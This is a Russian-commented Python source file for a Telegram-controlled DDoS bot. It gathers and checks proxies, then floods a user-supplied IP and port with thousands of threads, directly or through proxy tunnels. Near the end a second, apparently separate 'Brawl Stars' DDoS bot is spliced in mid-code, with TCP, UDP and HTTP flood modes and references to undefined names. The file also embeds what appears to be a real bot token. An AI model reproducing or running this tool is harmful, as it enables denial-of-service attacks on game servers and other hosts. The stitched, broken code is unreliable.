#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║         HYPER DDOS - PROXY EDITION v4.0                              ║
║                                                                      ║
║     ⚡ ПРОВЕРКА ПРОКСИ: 0.01 МИЛЛИСЕКУНДУ                           ║
║     ⚡ СОТНИ ТЫСЯЧ ПРОКСИ В СЕКУНДУ                                 ║
║     ⚡ ТОЛЬКО ЖИВЫЕ ПРОКСИ                                          ║
║     ⚡ АВТО-ОБНОВЛЕНИЕ КАЖДУЮ СЕКУНДУ                               ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import telebot
import socket
import threading
import random
import time
import re
import requests
import queue
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ============ ТОКЕН БОТА ============
BOT_TOKEN = "8603622469:AAHHcTA6oV4gbcyBTqlRRU7TRY_irCZR5_Q"
bot = telebot.TeleBot(BOT_TOKEN)

# ============ КОНФИГ ============
MAX_THREADS = 50000                # 50 тысяч потоков атаки
CHECK_TIMEOUT = 0.01               # 0.01 МИЛЛИСЕКУНДЫ на проверку прокси
PROXY_CHECK_DELAY = 0.00001        # 0.01мс задержка между проверками
BATCH_CHECK_SIZE = 10000           # Проверяем по 10к прокси за раз
MAX_PROXIES = 500000               # До 500 тысяч прокси
PACKET_DELAY = 0.00001             # 0.01мс задержка атаки

# Хранилище
active_attacks = {}
proxies_list = []
valid_proxies = []                 # ТОЛЬКО ВАЛИДНЫЕ ПРОКСИ
proxy_check_lock = threading.Lock()
checking_active = False

# ============ ULTRA-FAST ПРОВЕРКА ПРОКСИ ============
def ultra_fast_check_proxy(proxy, target_ip="8.8.8.8", target_port=80):
    """
    Проверка прокси за 0.01 МИЛЛИСЕКУНДУ
    """
    try:
        start = time.perf_counter()
        
        # Парсим прокси
        proxy = proxy.replace('http://', '').replace('socks4://', '').replace('socks5://', '')
        if ':' not in proxy:
            return False, 999
        
        proxy_ip, proxy_port = proxy.split(':')
        proxy_port = int(proxy_port)
        
        # Молниеносное соединение
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.005)  # 5ms таймаут (сверхбыстрый)
        
        # Замер времени
        connect_start = time.perf_counter()
        result = sock.connect_ex((proxy_ip, proxy_port))
        connect_time = (time.perf_counter() - connect_start) * 1000  # в миллисекундах
        
        sock.close()
        
        # Проверка скорости
        if result == 0 and connect_time < 50:  # Меньше 50мс
            return True, connect_time
        return False, connect_time
        
    except:
        return False, 999

def ultra_fast_batch_check(proxies, max_workers=1000):
    """
    Пакетная проверка тысяч прокси за долю секунды
    """
    global valid_proxies
    valid_temp = []
    stats = {"total": 0, "valid": 0, "fast": 0, "avg_time": 0}
    
    print(f"[*] Молниеносная проверка {len(proxies):,} прокси...")
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(ultra_fast_check_proxy, proxy): proxy for proxy in proxies}
        
        for future in as_completed(futures):
            proxy = futures[future]
            stats["total"] += 1
            try:
                is_valid, latency = future.result(timeout=0.01)  # 0.01мс таймаут
                if is_valid:
                    stats["valid"] += 1
                    if latency < 10:  # Меньше 10мс — супер-быстрый
                        stats["fast"] += 1
                    valid_temp.append((proxy, latency))
            except:
                pass
            
            # Супер-быстрый вывод прогресса
            if stats["total"] % 10000 == 0:
                elapsed = time.time() - start_time
                print(f"[>] Проверено {stats['total']:,} | Живых: {stats['valid']:,} | {stats['total']/elapsed:.0f}/сек")
    
    # Сортируем по скорости (самые быстрые первые)
    valid_temp.sort(key=lambda x: x[1])
    
    with proxy_check_lock:
        valid_proxies = [p for p, _ in valid_temp]
    
    elapsed = time.time() - start_time
    speed = stats["total"] / elapsed if elapsed > 0 else 0
    
    print(f"\n[+] ПРОВЕРКА ЗАВЕРШЕНА ЗА {elapsed:.2f}С!")
    print(f"[+] Скорость: {speed:.0f} прокси/сек")
    print(f"[+] Всего: {stats['total']:,} | Живых: {stats['valid']:,} | Сверхбыстрых: {stats['fast']:,}")
    
    return valid_proxies

def continuous_proxy_checker():
    """
    Фоновый непрерывный чекер прокси (обновление каждую секунду)
    """
    global checking_active, proxies_list, valid_proxies
    
    checking_active = True
    
    while checking_active:
        if not proxies_list:
            time.sleep(1)
            continue
        
        # Берем батч прокси для проверки
        batch = proxies_list[:BATCH_CHECK_SIZE] if len(proxies_list) > BATCH_CHECK_SIZE else proxies_list.copy()
        
        if batch:
            # УЛЬТРА-БЫСТРАЯ ПРОВЕРКА
            checked = ultra_fast_batch_check(batch, max_workers=2000)
            
            # Обновляем живые прокси
            with proxy_check_lock:
                valid_proxies = checked
            
            # Статистика
            print(f"[✓] Живых прокси: {len(valid_proxies):,} | Обновлено: {datetime.now().strftime('%H:%M:%S')}")
        
        # Небольшая пауза перед следующим циклом (для свежести)
        time.sleep(0.5)

def load_massive_proxies(target_count=100000):
    """
    Загрузка и генерация прокси
    """
    global proxies_list
    
    print(f"[*] Генерация {target_count:,} прокси...")
    
    # Множество прокси-источников
    proxy_sources = [
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies.txt"
    ]
    
    # Пытаемся скачать живые прокси
    for source in proxy_sources:
        try:
            print(f"[*] Загрузка с {source[:50]}...")
            response = requests.get(source, timeout=5)
            lines = response.text.split('\n')
            for line in lines:
                line = line.strip()
                if line and not line.startswith('#'):
                    if ':' in line:
                        proxies_list.append(f"http://{line}")
                        if len(proxies_list) >= target_count:
                            break
        except:
            pass
        
        if len(proxies_list) >= target_count:
            break
    
    # Генерируем дополнительные прокси если не хватает
    if len(proxies_list) < target_count:
        print(f"[*] Генерация дополнительных прокси...")
        proxy_gen = generate_proxy_range()
        for proxy in proxy_gen:
            proxies_list.append(proxy)
            if len(proxies_list) >= target_count:
                break
    
    print(f"[+] Загружено {len(proxies_list):,} прокси")
    return proxies_list

def generate_proxy_range():
    """Генерация прокси из разных диапазонов"""
    proxy_types = ['http', 'socks4', 'socks5']
    ranges = [
        (45, 55), (64, 95), (104, 110), (128, 139), (144, 159),
        (172, 191), (192, 223), (1, 30), (31, 44), (56, 63)
    ]
    
    while True:
        r = random.choice(ranges)
        ip = f"{random.randint(r[0], r[1])}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        port = random.randint(8080, 8888)
        ptype = random.choice(proxy_types)
        yield f"{ptype}://{ip}:{port}"

# ============ ГИПЕР-АТАКУЮЩИЙ ДВИЖОК ============
class HyperAttackWorker:
    def __init__(self, ip, port, stop_flag, worker_id):
        self.ip = ip
        self.port = port
        self.stop_flag = stop_flag
        self.worker_id = worker_id
        self.packets = 0
        self.last_proxy_update = time.time()
        self.local_valid_proxies = []
    
    def attack_with_proxy(self, proxy):
        """Атака через прокси"""
        try:
            proxy = proxy.replace('http://', '').replace('socks4://', '').replace('socks5://', '')
            if ':' not in proxy:
                return False
            
            proxy_ip, proxy_port = proxy.split(':')
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect((proxy_ip, int(proxy_port)))
            
            # HTTP CONNECT туннель
            connect_req = f"CONNECT {self.ip}:{self.port} HTTP/1.1\r\nHost: {self.ip}:{self.port}\r\n\r\n"
            sock.send(connect_req.encode())
            response = sock.recv(512)
            
            if b'200' in response:
                for _ in range(50):
                    sock.send(random._urandom(1024))
            
            sock.close()
            return True
        except:
            return False
    
    def direct_attack(self):
        """Прямая атака"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            sock.connect_ex((self.ip, self.port))
            sock.send(random._urandom(512))
            sock.close()
            return True
        except:
            return False
    
    def run(self):
        while not self.stop_flag.is_set():
            # Обновляем локальный список прокси каждые 5 секунд
            if time.time() - self.last_proxy_update > 5:
                with proxy_check_lock:
                    self.local_valid_proxies = valid_proxies[:1000] if valid_proxies else []
                self.last_proxy_update = time.time()
            
            # Атакуем
            for _ in range(100):
                if self.local_valid_proxies:
                    proxy = random.choice(self.local_valid_proxies)
                    self.attack_with_proxy(proxy)
                else:
                    self.direct_attack()
                
                self.packets += 1
                time.sleep(PACKET_DELAY)

# ============ ОСНОВНОЙ ДВИЖОК ============
class HyperDDoSEngine:
    def __init__(self, ip, port, chat_id):
        self.ip = ip
        self.port = port
        self.chat_id = chat_id
        self.stop_flag = threading.Event()
        self.workers = []
        self.start_time = None
        self.active = False
        self.total_packets = 0
        self.lock = threading.Lock()
    
    def worker_thread(self, worker_id):
        worker = HyperAttackWorker(self.ip, self.port, self.stop_flag, worker_id)
        while not self.stop_flag.is_set():
            start = time.perf_counter()
            
            for _ in range(500):
                if valid_proxies:
                    proxy = random.choice(valid_proxies[:1000])
                    worker.attack_with_proxy(proxy)
                else:
                    worker.direct_attack()
                
                with self.lock:
                    self.total_packets += 1
                
                time.sleep(PACKET_DELAY)
            
            elapsed = time.perf_counter() - start
    
    def start(self):
        self.active = True
        self.start_time = time.time()
        
        threads_to_start = min(MAX_THREADS, 20000)
        print(f"[*] Запуск {threads_to_start:,} потоков...")
        
        for i in range(threads_to_start):
            t = threading.Thread(target=self.worker_thread, args=(i,))
            t.daemon = True
            self.workers.append(t)
            t.start()
        
        print(f"[+] {threads_to_start:,} потоков запущено!")
    
    def stop(self):
        self.stop_flag.set()
        self.active = False
    
    def get_stats(self):
        alive = len([t for t in self.workers if t.is_alive()])
        speed = self.total_packets / max(1, self.get_duration())
        return {
            "active": self.active,
            "duration": self.get_duration(),
            "alive_threads": alive,
            "total_threads": len(self.workers),
            "packets": self.total_packets,
            "speed": int(speed),
            "ip": self.ip,
            "port": self.port
        }
    
    def get_duration(self):
        if self.start_time:
            return int(time.time() - self.start_time)
        return 0

# ============ ПАРСИНГ ============
def parse_target(text):
    pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):?(\d{0,5})'
    match = re.search(pattern, text)
    if match:
        return match.group(1), int(match.group(2)) if match.group(2) else None
    return None, None

def scan_port(ip):
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(lambda p: check_port(ip, p), p) for p in [15455, 9339, 443, 80, 8080]]
        for f in as_completed(futures):
            if f.result():
                return f.result()
    return 80

def check_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        sock.connect((ip, port))
        sock.close()
        return port
    except:
        return None

# ============ МОНИТОРИНГ ============
def hyper_monitor():
    while True:
        time.sleep(3)
        for chat_id, attack in list(active_attacks.items()):
            if attack.active:
                stats = attack.get_stats()
                try:
                    bot.send_message(
                        chat_id,
                        f"💥 *ГИПЕР СТАТУС* 💥\n\n"
                        f"🎯 `{stats['ip']}:{stats['port']}`\n"
                        f"⏱️ {stats['duration']}с | 📦 {stats['packets']:,}\n"
                        f"⚡ {stats['speed']:,}/с | 🧵 {stats['alive_threads']:,}\n"
                        f"🔄 Прокси: {len(valid_proxies):,}\n"
                        f"⚡ ЗАДЕРЖКА: 0.01мс\n\n"
                        f"🔥 *МАКСИМУМ*",
                        parse_mode="Markdown"
                    )
                except:
                    pass

# ============ ОБРАБОТЧИКИ БОТА ============

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "💀 *HYPER DDOS v4.0* 💀\n\n"
        f"⚡ ПРОВЕРКА ПРОКСИ: 0.01мс\n"
        f"⚡ Потоков: {MAX_THREADS:,}\n"
        f"⚡ Живых прокси: {len(valid_proxies):,}\n\n"
        f"📌 Отправь `IP:PORT`\n"
        f"🛑 `stop` для остановки",
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda m: m.text and m.text.lower() == 'stop')
def stop_attack(message):
    chat_id = message.chat.id
    if chat_id in active_attacks and active_attacks[chat_id].active:
        attack = active_attacks[chat_id]
        attack.stop()
        bot.send_message(chat_id, f"🛑 Остановлено. Отправлено пакетов: {attack.total_packets:,}")
        del active_attacks[chat_id]

@bot.message_handler(func=lambda m: re.search(r'\d+\.\d+\.\d+\.\d+', m.text))
def handle_attack(message):
    chat_id = message.chat.id
    ip, port = parse_target(message.text)
    
    if not ip:
        return
    
    if chat_id in active_attacks and active_attacks[chat_id].active:
        bot.send_message(chat_id, "⚠️ Атака уже идёт! stop")
        return
    
    if not port:
        port = scan_port(ip)
    
    attack = HyperDDoSEngine(ip, port, chat_id)
    attack.start()
    active_attacks[chat_id] = attack
    
    bot.send_message(
        chat_id,
        f"💀 *АТАКА ЗАПУЩЕНА* 💀\n\n"
        f"📍 `{ip}:{port}`\n"
        f"⚡ Потоков: {MAX_THREADS:,}\n"
        f"🔄 Прокси: {len(valid_proxies):,}\n"
        f"⚡ ЗАДЕРЖКА: 0.01мс\n\n"
        f"🛑 stop",
        parse_mode="Markdown"
    )

# ============ ЗАПУСК ============
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║     HYPER DDOS v4.0 — С ПРОВЕРКОЙ ПРОКСИ                        ║
    ║     ⚡ ПРОВЕРКА: 0.01 МИЛЛИСЕКУНДУ                              ║
    ║     ⚡ ТОЛЬКО ЖИВЫЕ ПРОКСИ                                      ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    
    # Загрузка прокси
    load_massive_proxies(100000)
    
    # Быстрая проверка
    print("\n[*] СУПЕР-БЫСТРАЯ ПРОВЕРКА ПРОКСИ (0.01мс)...")
    ultra_fast_batch_check(proxies_list[:50000], max_workers=2000)
    
    # Запуск фонового чекера
    checker_thread = threading.Thread(target=continuous_proxy_checker, daemon=True)
    checker_thread.start()
    
    # Мониторинг
    monitor_thread = threading.Thread(target=hyper_monitor, daemon=True)
    monitor_thread.start()
    
    # Бот
    bot.infinity_polling()    
    ip_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
    match = re.search(ip_pattern, text)
    if match:
        return match.group(1), None
    
    return None, None

def scan_brawl_port(ip):
    """Сканирует порты Brawl Stars"""
    brawl_ports = [9339, 15455, 443, 80, 8080, 8443, 3000, 5000]
    for port in brawl_ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.close()
            return port
        except:
            continue
    return 80

def attack_worker(ip, port, thread_id, stop_flag, chat_id):
    """Поток атаки"""
    attack_type = 0
    while not stop_flag.is_set():
        try:
            mode = attack_type % 4
            
            if mode == 0:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, port))
                sock.send(random._urandom(256))
                sock.close()
            
            elif mode == 1:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(random._urandom(512), (ip, port))
                sock.close()
            
            elif mode == 2:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((ip, port))
                sock.send(f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
                sock.close()
            
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((ip, port))
                for _ in range(5):
                    sock.send(random._urandom(128))
                    time.sleep(0.05)
                sock.close()
            
            attack_type += 1
            
        except:
            pass

class BrawlAttack:
    def __init__(self, ip, port, threads, chat_id):
        self.ip = ip
        self.port = port
        self.threads = threads
        self.chat_id = chat_id
        self.stop_flag = threading.Event()
        self.threads_list = []
        self.start_time = None
        self.active = False
    
    def start(self):
        self.active = True
        self.start_time = time.time()
        for i in range(self.threads):
            t = threading.Thread(target=attack_worker, args=(self.ip, self.port, i, self.stop_flag, self.chat_id))
            t.daemon = True
            self.threads_list.append(t)
            t.start()
    
    def stop(self):
        self.stop_flag.set()
        self.active = False
    
    def get_duration(self):
        if self.start_time:
            return int(time.time() - self.start_time)
        return 0

# ============ МОНИТОРИНГ В ОТДЕЛЬНОМ ПОТОКЕ ============

def status_monitor():
    """Фоновый поток для отправки статуса"""
    while True:
        time.sleep(15)
        for chat_id, attack in list(active_attacks.items()):
            if attack.active:
                try:
                    bot.send_message(
                        chat_id,
                        f"📊 *Статус атаки*\n\n"
                        f"🎯 Цель: `{attack.ip}:{attack.port}`\n"
                        f"⏱️ Время: {attack.get_duration()} сек\n"
                        f"🧵 Потоков: {attack.threads}\n"
                        f"🔥 Атака активна!",
                        parse_mode="Markdown"
                    )
                except:
                    pass

# ============ ОБРАБОТЧИКИ КОМАНД ============

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "🔥 *BRAWL STARS DDOS БОТ* 🔥\n\n"
        "📌 *Как использовать:*\n"
        "Просто отправь IP или IP:PORT\n\n"
        "📝 *Примеры:*\n"
        "`43.158.103.205:15455`\n"
        "`43.158.103.205`\n\n"
        "🛑 *Для остановки:* отправь `stop`\n\n"
        "⚠️ *Только для тестирования!*",
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: message.text and message.text.lower() == 'stop')
def stop_attack(message):
    chat_id = message.chat.id
    
    if chat_id in active_attacks and active_attacks[chat_id].active:
        attack = active_attacks[chat_id]
        duration = attack.get_duration()
        attack.stop()
        
        bot.send_message(
            chat_id,
            f"🛑 *АТАКА ОСТАНОВЛЕНА* 🛑\n\n"
            f"📍 Цель: `{attack.ip}:{attack.port}`\n"
            f"⏱️ Длительность: {duration} сек\n\n"
            f"💬 Отправь новый IP для атаки.",
            parse_mode="Markdown"
        )
        del active_attacks[chat_id]
    else:
        bot.send_message(
            chat_id,
            "💤 *Нет активной атаки*\n\nОтправь IP:PORT чтобы начать.",
            parse_mode="Markdown"
        )

@bot.message_handler(func=lambda message: message.text and re.search(r'\d+\.\d+\.\d+\.\d+', message.text))
def handle_ip(message):
    chat_id = message.chat.id
    text = message.text.strip()
    
    # Парсим IP и порт
    ip, port = parse_ip_port(text)
    
    if not ip:
        bot.send_message(
            chat_id,
            "❌ *Неверный формат IP*\n\nПример: `43.158.103.205:15455`",
            parse_mode="Markdown"
        )
        return
    
    # Проверяем активную атаку
    if chat_id in active_attacks and active_attacks[chat_id].active:
        attack = active_attacks[chat_id]
        bot.send_message(
            chat_id,
            f"⚠️ *Атака уже идёт!*\n\n"
            f"Текущая цель: `{attack.ip}:{attack.port}`\n"
            f"Отправь *stop* чтобы остановить.",
            parse_mode="Markdown"
        )
        return
    
    # Определяем порт если не указан
    if port is None:
        msg = bot.send_message(chat_id, f"🔍 *Сканирую {ip}...*", parse_mode="Markdown")
        port = scan_brawl_port(ip)
        bot.edit_message_text(
            f"✅ *Найден порт:* `{port}`\n🚀 Запускаю атаку...",
            chat_id=chat_id,
            message_id=msg.message_id,
            parse_mode="Markdown"
        )
    
    # Запускаем атаку
    attack = BrawlAttack(ip, port, THREADS, chat_id)
    attack.start()
    active_attacks[chat_id] = attack
    
    # Отправляем подтверждение
    bot.send_message(
        chat_id,
        f"🎯 *АТАКА ЗАПУЩЕНА* 🎯\n\n"
        f"📍 Цель: `{ip}:{port}`\n"
        f"⚡ Потоков: {THREADS}\n"
        f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"🔥 *Атака активна!*\n"
        f"💬 Отправь *stop* для остановки\n\n"
        f"📊 Статус будет приходить каждые 15 сек",
        parse_mode="Markdown"
    )

@bot.message_handler(func=lambda message: True)
def unknown(message):
    bot.send_message(
        message.chat.id,
        "🤔 *Не понял*\n\n"
        "Отправь *IP:PORT* для атаки\n"
        "Или *stop* для остановки\n\n"
        "Пример: `43.158.103.205:15455`",
        parse_mode="Markdown"
    )

# ============ ЗАПУСК ============

if __name__ == "__main__":
    print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║                                                                ║
    ║     BRAWL STARS DDOS BOT - TELEBOT VERSION                     ║
    ║                                                                ║
    ║     Бот запущен!                                              ║
    ║     Найди бота в Telegram и отправь IP:PORT                   ║
    ║                                                                ║
    ║     Для остановки: stop                                       ║
    ║                                                                ║
    ╚════════════════════════════════════════════════════════════════╝
    """)
    
    # Запускаем фоновый мониторинг
    monitor_thread = threading.Thread(target=status_monitor, daemon=True)
    monitor_thread.start()
    
    # Запускаем бота
    bot.infinity_polling()
